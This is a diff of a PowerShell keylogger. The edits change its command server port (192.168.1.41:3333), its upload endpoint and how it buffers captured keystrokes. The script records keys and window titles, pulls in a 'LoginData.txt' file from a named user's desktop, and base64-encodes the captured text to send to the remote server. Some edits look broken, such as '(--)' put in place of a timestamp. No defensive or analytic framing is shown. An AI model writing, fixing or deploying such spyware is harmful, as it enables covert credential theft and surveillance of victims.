@@ -1,5 +1,5 @@
 
-$server = 'http://192.168.1.41:2222'
+$server = 'http://192.168.1.41:3333'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
@@ -134,7 +134,7 @@ while ($true) {
 			if ($SpaceBar)     {$Outout += '[SpaceBar]'}
 			if ($DeleteKey)    {$Outout += '[Delete]'}
 			if ($EnterKey)     {$Outout += '[Enter]'}
-			if ($BackSpaceKey) {$Outout += '[Backspace]'}
+			if ($BackSpaceKey) {$Outout += '[get-clipboard]'}
 			if ($LeftArrow)    {$Outout += '[Left Arrow]'}
 			if ($RightArrow)   {$Outout += '[Right Arrow]'}
 			if ($UpArrow)      {$Outout += '[Up Arrow]'}
@@ -160,13 +160,13 @@ while ($true) {
 			if ($unicode_res -gt 0) {
 				if ($WindowTitle -ne $LastWindowTitle){
 					# if the window has changed
-					$TimeStamp = (get-clipboard)
+					$TimeStamp = (--)
 					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
                     $outfile += get-item "C:\Users\Mehmet Dere\Desktop\Yeniklasör\LoginData.txt"
 				$Outout += $mychar.ToString()
-				$buff += $outfile
+				$buff += $Outout
 			}
 		}
 	}
@@ -175,7 +175,7 @@ while ($true) {
 		$timer = 0
 		$buff = $buff.Trim()
 		if($buff.Length -gt 10) {
-			if((New-Object Net.WebClient).DownloadString($server+'/set_lib/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
+			if((New-Object Net.WebClient).DownloadString($server+'/set_log/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
 				Exit
 			}
 
